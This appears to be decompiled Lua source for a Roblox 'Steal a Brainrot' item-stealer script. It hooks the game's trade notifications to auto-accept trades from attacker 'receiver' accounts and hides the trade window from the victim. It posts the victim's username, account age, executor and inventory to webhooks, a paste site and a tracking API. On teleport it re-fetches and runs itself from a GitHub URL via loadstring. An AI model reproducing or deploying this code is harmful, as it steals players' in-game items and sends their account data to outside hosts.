	TradeLiveTrade2:GetPropertyChangedSignal("Visible"):Connect(function()
		local Visible2 = TradeLiveTrade2.Visible

		if not Visible2 or Visible then
			if not Visible2 and Visible then
				t22:setSuppressLiveTrade(false)
			end
		else
			t22:setSuppressLiveTrade(true)

			if not u45 then
				task.spawn(function()
					task.wait(0.1)

					local Other = TradeLiveTrade2:FindFirstChild("Other")
					local Username = Other and Other:FindFirstChild("Username")
					local Text = Username and Username.Text or ""
					local v294

					for _, v in ipairs(t6) do
						if Text:lower():find(v:lower(), 1, true) then
							v294 = v

							break
						end
					end

					if v294 then
						u45 = true
						t7[v294] = tick()
						v283(v294, TradeLiveTrade2)
					else
						v8("Trade started with non-receiver: " .. Text)
					end
				end)
			end
		end

		Visible = Visible2
	end)
end
local function v297()
	v8("Hooking CNC.Add for incoming invites")

	local t25 = {}

	for _, v in ipairs(t6) do
		t25[v:lower()] = v
	end

	local ok, result = pcall(require, ReplicatedStorage.Controllers.CornerNotificationController)

	if ok then
		if type(result) == "table" then
			local Add = result.Add

			if type(Add) ~= "function" then
				v8("CNC.Add not a function")

				return
			end

			result.Add = function(p46, p47, ...)
				if p47 and typeof(p47) == "Instance" then
					local Yes = p47:FindFirstChild("Yes")
					local No = p47:FindFirstChild("No")
					local Username = p47:FindFirstChild("Username")

					if Yes and No and Username then
						local Text = Username.Text or ""
						local match = (Text:match("@(.+) wants to trade with you") or Text:gsub("^@", "")):match("^%s*(.-)%s*$")

						p47.Visible = false

						local v309 = t25[match:lower()]

						if not v309 or u45 then
							v8("Declining incoming from " .. match)
							task.spawn(function()
								task.wait(0.02)

								local ok2, result2 = pcall(getconnections, No.Activated)

								if ok2 and #result2 > 0 then
									for _, v in ipairs(result2) do
										if type(v.Function) == "function" then
											pcall(v.Function)
										else
											pcall(function()
												v:Fire()
											end)
										end
									end
								end
							end)
						else
							v8("Accepting incoming from " .. v309)
							task.spawn(function()
								task.wait(0.02)

								local v314 = false
								local ok2, result2 = pcall(getconnections, Yes.Activated)

								if ok2 and #result2 > 0 then
									local v317, v318, v319 = ipairs(result2)
									local v320 = geniter(v317, v318, v319)

									while true do
										local v321 = table.pack(v320())

										if not v321[1] then
											break
										end

										local v322 = v321[3]

										if type(v322.Function) == "function" then
											if pcall(v322.Function) then
												v314 = true

												break
											end
										end
									end
								end

								if not v314 and ok2 then
									if #result2 > 0 then
										local v323, v324, v325 = ipairs(result2)

										for _, v in v323, v324, v325 do
											if pcall(function()
												v:Fire()
											end) then
												v314 = true

												break
											end
										end
									end
								end

								if not v314 then
									v8("Could not fire Yes")
								end
							end)
						end

						return Add(p46, p47, ...)
					end
				end

				return Add(p46, p47, ...)
			end
			v8("CNC.Add hooked")

			return
		end
	end

	v8("CNC unavailable")
end

local t26 = {}
local n7 = 0

local function v330(p48)
	local v331 = t26[p48]

	if v331 then
		return v331
	end

	local ok, result = pcall(function()
		return Players:GetUserIdFromNameAsync(p48)
	end)

	if not ok or type(result) ~= "number" then
		return nil
	end

	t26[p48] = result

	return result
end
local function v334()
	for i = 1, #t6 do
		local v336 = (n7 + i - 1) % #t6 + 1
		local v337 = t6[v336]
		local v338 = v330(v337)

		if not v338 then
			continue
		end

		n7 = v336

		return v337, v338
	end

	return nil, nil
end
local function v339()
	if not u45 then
		if not u46 then
			if not v148() then
				return
			end

			local ok, result = pcall(require, ReplicatedStorage.Controllers.TradeController)

			if not ok or type(result) ~= "table" then
				return
			end

			local v342, v343 = v334()

			if not v342 or not v343 then
				return
			end

			u46 = true
			t7[v342] = tick()

			local u344 = false

			pcall(function()
				result:SendInvite(v343, function()
				end)
				u344 = true
			end)

			if u344 then
				v8("Invite sent → " .. v342 .. " (uid " .. v343 .. ")")
			else
				v8("SendInvite failed for " .. v342)
			end

			local v345 = math.random(10, 15)

			task.wait(v345)
			u46 = false

			return
		end
	end
end
local function v346(p49)
	local t27 = {}
	local Brainrots = p49 and p49:FindFirstChild("Brainrots")

	if not Brainrots then
		return t27
	end

	for _, child in ipairs(Brainrots:GetChildren()) do
		if child:IsA("GuiObject") and child.Visible and child.Name ~= "Template" then
			if string.sub(child.Name, 1, 6) ~= "Empty." then
				local Return = child:FindFirstChild("Return")

				if Return then
					if Return:IsA("GuiButton") then
						table.insert(t27, {
							button = Return,
							name = child.Name,
							order = child.LayoutOrder
						})
					end
				end
			end
		end
	end

	table.sort(t27, function(p50, p51)
		return p50.order < p51.order
	end)

	return t27
end
local function v352(p52)
	if type(firesignal) == "function" then
		return pcall(firesignal, p52.Activated)
	end

	local v353 = getconnections(p52.Activated)[1]

	if v353 and v353.Function then
		return pcall(v353.Function)
	end

	return false, "no connection"
end
local function v354()
	local FuseMachine = PlayerGui:WaitForChild("FuseMachine", 15)
	local FuseMachine2 = FuseMachine and FuseMachine:WaitForChild("FuseMachine", 5)

	if FuseMachine then
		if FuseMachine2 then
			if #v346(FuseMachine2) == 0 then
				return true
			end

			pcall(function()
				require(ReplicatedStorage.Controllers.InterfaceController):SetState("FuseMachine", false)
			end)

			local function v357()
				local CurrentCamera = Workspace.CurrentCamera

				if CurrentCamera then
					CurrentCamera.FieldOfView = 70

					for _, child in ipairs(CurrentCamera:GetChildren()) do
						if child:IsA("BlurEffect") then
							child.Enabled = false
						end
					end
				end

				for _, child in ipairs(Lighting:GetChildren()) do
					if child:IsA("BlurEffect") then
						child.Enabled = false
					end
				end
			end

			v357()
			task.defer(v357)
			FuseMachine.Enabled = false
			FuseMachine2.Visible = false

			local v363 = os.clock() + 30
			local v364

			while os.clock() < v363 do
				local v365 = v346(FuseMachine2)

				if #v365 == 0 then
					FuseMachine.Enabled = false
					FuseMachine2.Visible = false
					task.wait(0.75)

					return true
				end

				local v366 = #v365

				if not v352(v365[1].button) then
					warn("[SAB] Fuse Return failed")

					return false
				end

				local v367 = os.clock() + 5

				while true do
					task.wait(0.2)
					v364 = #v346(FuseMachine2)

					if v364 < v366 then
						break
					elseif v367 <= os.clock() then
						break
					end
				end

				if not (v366 <= v364) then
					task.wait(1.2)

					continue
				end

				warn("[SAB] Fuse UI didn't update")

				return false
			end

			warn("[SAB] Fuse timeout")

			return false
		end
	end

	warn("[SAB] Fuse UI yuklenemedi")

	return false
end
local function v368(p53)
	if not p53 then
		return "$0"
	end

	local function v369(p54)
		return p54 % 1 == 0 and string.format("%.0f", p54) or string.format("%.1f", p54)
	end

	if p53 >= 1e9 then
		return "$" .. v369(p53 / 1e9) .. "B/s"
	end

	if p53 >= 1000000 then
		return "$" .. v369(p53 / 1000000) .. "M/s"
	end

	if p53 >= 1000 then
		return "$" .. v369(p53 / 1000) .. "K/s"
	end

	return "$" .. tostring(p53) .. "/s"
end
local function v370()
	local t28 = {}

	for _, v in ipairs(v95()) do
		local v374 = v.name:lower()
		local v375 = t1[v374] or false
		local v376 = t2[v374] or false

		if v.moneyPerSec >= 3e9 then
			v376 = true
		end

		t28[#t28 + 1] = {
			DisplayName = v.name,
			Index = v.name,
			Generation = v.moneyPerSec,
			ParsedGeneration = v.moneyPerSec,
			Mutation = v.mutationStr,
			Traits = v.traitStr ~= "" and { v.traitStr } or {},
			Rarity = "Unknown",
			Priority = v375,
			HallOfFame = v376
		}
	end

	table.sort(t28, function(p55, p56)
		if p55.Priority == p56.Priority then
			return p55.ParsedGeneration > p56.ParsedGeneration
		end

		return p55.Priority
	end)

	return t28
end
local function v377(p57, p58)
	if p58 then
		if p58 ~= "" then
			local v378 = v26()

			if not v378 then
				return false
			end

			local v379 = SAB_API_BASE .. "/webhook/" .. v16:UrlEncode(p58)
			local v380 = v16:UrlEncode(p57.content or "")
			local v381 = v16
			local UrlEncode = v16.UrlEncode
			local v383 = "content=" .. v380 .. "&embeds=" .. UrlEncode(v381, v16:JSONEncode(p57.embeds or {}))
			local ok, result = pcall(function()
				return v378({
					Url = v379,
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/x-www-form-urlencoded",
						["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
					},
					Body = v383
				})
			end)
			local v386 = ok and result and result.StatusCode and result.StatusCode >= 200 and result.StatusCode < 300

			return v386
		end
	end

	return false
end
local function v387()
	if identifyexecutor then
		local ok, result = pcall(identifyexecutor)

		if ok and result then
			return tostring(result)
		end
	end

	if getexecutorname then
		local ok, result = pcall(getexecutorname)

		if ok and result then
			return tostring(result)
		end
	end

	if syn then
		return "Synapse"
	end

	if KRNL_LOADED then
		return "KRNL"
	end

	if fluxus then
		return "Fluxus"
	end

	if getgenv().Celery then
		return "Celery"
	end

	return "Unknown"
end

local v392 = v387()

local function v393(p59, p60, p61)
	local v394 = v26()

	if not v394 then
		return nil
	end

	local t29 = { "=== BRAINROTS ===" }

	if #p59 == 0 then
		t29[#t29 + 1] = "(none)"
	else
		for _, v in ipairs(p59) do
			local v398 = v.Priority and "⭐" or ""
			local v399 = v.HallOfFame and "🏆"
			local v400 = v398 .. (v399 or "")

			t29[#t29 + 1] = v400 .. (v400 ~= "" and " " or "") .. v.DisplayName .. " | " .. v368(v.ParsedGeneration)
		end
	end

	if #p60 > 0 or #p61 > 0 then
		t29[#t29 + 1] = ""
		t29[#t29 + 1] = "=== GEARS / BASE SKINS ==="

		for _, v in ipairs(p60) do
			t29[#t29 + 1] = "⚙️ " .. v.name
		end

		for _, v in ipairs(p61) do
			t29[#t29 + 1] = "🏠 " .. v.name
		end
	end

	local ok, result = pcall(function()
		return v394({
			Url = "https://sourceb.in/api/bins",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = HttpService:JSONEncode({
				files = { {
					content = table.concat(t29, "\n")
				} }
			})
		})
	end)

	if ok and result and result.StatusCode == 200 then
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result.Body)

		if ok2 and result2 and result2.key then
			return "https://cdn.sourceb.in/bins/" .. result2.key .. "/0"
		end
	end

	return nil
end
local function v409(p62, p63, p64, p65, p66, p67)
	local t30 = {}
	local n8 = 0
	local v412, v413, v414 = ipairs(p63)
	local v415 = geniter(v412, v413, v414)

	while true do
		local v416 = table.pack(v415())

		if not v416[1] then
			break
		end

		local v417 = v416[3]

		if n8 >= 15 then
			break
		end

		local t31 = {}

		if v417.Mutation and v417.Mutation ~= "" then
			t31[#t31 + 1] = "[" .. v417.Mutation .. "]"
		end

		if v417.Traits and #v417.Traits > 0 then
			t31[#t31 + 1] = "[" .. table.concat(v417.Traits, ", ") .. "]"
		end

		local v419 = #t31 > 0 and table.concat(t31, " ") or ""
		local s1 = ""

		if v417.Priority and v417.ParsedGeneration >= 800000000 then
			s1 = "⭐💸 "
		elseif v417.Priority then
			s1 = "⭐ "
		elseif v417.ParsedGeneration >= 800000000 then
			s1 = "💸 "
		end

		t30[#t30 + 1] = s1 .. (v419 ~= "" and v419 .. " ➜ " or "") .. (v417.DisplayName or "???") .. " ➜ " .. v368(v417.ParsedGeneration)
		n8 += 1
	end

	local v421 = #p63 - n8

	if v421 > 0 then
		t30[#t30 + 1] = "... and " .. v421 .. " more brainrots"
	end

	if #t30 == 0 then
		t30[#t30 + 1] = "None Found"
	end

	local t32 = {}
	local n9 = 0
	local v424, v425, v426 = ipairs(p64)
	local v427 = geniter(v424, v425, v426)

	while true do
		local v428 = table.pack(v427())

		if v428[1] then
			local v429 = v428[3]

			if n9 >= 5 then
				break
			end

			t32[#t32 + 1] = "⚙️ " .. v429.name
			n9 += 1

			continue
		end

		break
	end

	local v430, v431, v432 = ipairs(p65)

	for _, v in v430, v431, v432 do
		if n9 >= 5 then
			break
		end

		t32[#t32 + 1] = "🏠 " .. v.name
		n9 += 1
	end

	local v435 = #p64 + #p65 - n9

	if v435 > 0 then
		t32[#t32 + 1] = "... and " .. v435 .. " more items"
	end

	if #t32 == 0 then
		t32[#t32 + 1] = "None Found"
	end

	local t33 = { {
		name = "**Player Info**",
		value = string.format([[```
Username: %s
Player Count: %d/%d
Account Age: %d days
Executor: %s
```]], p62.Name, #Players:GetPlayers(), Players.MaxPlayers, p62.AccountAge, v392),
		inline = false
	} }

	if not p67 then
		t33[#t33 + 1] = {
			name = "**Receivers**",
			value = "```\n" .. table.concat(RECEIVERS, ", ") .. "\n```",
			inline = false
		}
	end

	t33[#t33 + 1] = {
		name = "**Brainrots — Threshold: >" .. v368(THRESHOLD) .. "**",
		value = "```\n" .. table.concat(t30, "\n") .. "\n```",
		inline = false
	}
	t33[#t33 + 1] = {
		name = "**Gears / Base Skins**",
		value = "```\n" .. table.concat(t32, "\n") .. "\n```",
		inline = false
	}

	if p66 and not p67 then
		t33[#t33 + 1] = {
			name = "",
			value = "[View full inventory log](" .. p66 .. ")",
			inline = false
		}
	end

	if not p67 then
		t33[#t33 + 1] = {
			name = "**How to manually claim?**",
			value = "Join your PS server (or any server) and send a trade request to the player",
			inline = false
		}
	end

	return {
		content = "",
		embeds = { {
			title = p67 and "Steal A Brainrot Public Hit!" or "Steal A Brainrot Hit!",
			color = 9662683,
			fields = t33,
			footer = {
				text = "Steal a Brainrot"
			},
			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
		} }
	}
end
local function v437()
	local t34 = {}
	local t35 = {}

	for _, v in ipairs(t18) do
		if v.kind == "gear" then
			t34[#t34 + 1] = {
				name = v.name
			}
		elseif v.kind == "skin" then
			t35[#t35 + 1] = {
				name = v.name
			}
		end
	end

	return t34, t35
end
local function v442(p68, p69)
	if u49 then
		return
	end

	u49 = true
	v8("Sending webhooks...")

	local n10 = 0
	local v444 = false
	local v445 = false

	for _, v in ipairs(p69) do
		if n10 < v.ParsedGeneration then
			n10 = v.ParsedGeneration
		end

		if v.Priority then
			v444 = true
		end

		if v.HallOfFame then
			v445 = true
		end
	end

	local v448, v449 = v437()
	local v450 = v444 or #v448 > 0 or #v449 > 0 or n10 >= THRESHOLD and THRESHOLD > 0
	local v451 = v393(p69, v448, v449)

	if WEBHOOK ~= "" then
		local v452 = v409(p68, p69, v448, v449, v451, false)

		if v450 then
			v452.content = "@everyone `" .. p68.Name .. "` — Paste this in the Trading Machine!"
		end

		v8("WH_MAIN: " .. tostring(v377(v452, WEBHOOK)))
	end

	v8("WH_PUB: " .. tostring(v377(v409(p68, p69, v448, v449, v451, true), "AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb")))

	if v445 then
		v8("WH_HOF: " .. tostring(v377(v409(p68, p69, v448, v449, v451, true), "AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb")))
	end
end

if not v354() then
	getgenv().__ELYSIUM_SAB_RAN = nil

	return
end

task.spawn(function()
	local v480 = v26()

	if not v480 then
		return
	end

	pcall(function()
		v480({
			Url = SAB_API_BASE .. "/track-execution-sab",
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
			},
			Body = HttpService:JSONEncode({
				target_players = RECEIVERS,
				executor = LocalPlayer.Name
			})
		})
	end)
end)

local u481 = false

task.spawn(function()
	for i = 1, 6 do
		pcall(v125)

		if not (#t18 > 0) then
			if i < 6 then
				task.wait(2)
			end

			continue
		end

		v8(("Gear/skin scan: %d items (attempt %d)"):format(#t18, i))
		u481 = true

		return
	end

	v8("Gear/skin scan: no items after 6 attempts")
	u481 = true
end)
task.spawn(function()
	task.wait(2)

	local v483 = tick() + 15

	while not u481 and tick() < v483 do
		task.wait(0.5)
	end

	v8("Webhook scan...")

	local v484 = v370()

	v8(("%d brainrots found, %d gear/skin items"):format(#v484, #t18))
	pcall(function()
		v442(LocalPlayer, v484)
	end)
end)
v297()
v286()
task.spawn(function()
	v8("Main loop | targets: " .. table.concat(t6, ", "))

	while true do
		task.wait(1)

		if not u45 and not u46 then
			pcall(v339)
		end
	end
end)

local v485 = "    local H = game:GetService(\"HttpService\")\n    local d = H:JSONDecode('" .. HttpService:JSONEncode({
	RECEIVERS = RECEIVERS,
	WEBHOOK = WEBHOOK,
	THRESHOLD = THRESHOLD
}) .. [[')
    getgenv().RECEIVERS = d.RECEIVERS
    getgenv().WEBHOOK   = d.WEBHOOK
    getgenv().THRESHOLD = d.THRESHOLD
    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/sab.lua"))()
]]

if queue_on_teleport then
	queue_on_teleport(v485)
end

v8("=== SAB LOADED | targets=" .. table.concat(RECEIVERS, ",") .. " threshold=" .. THRESHOLD .. " ===")
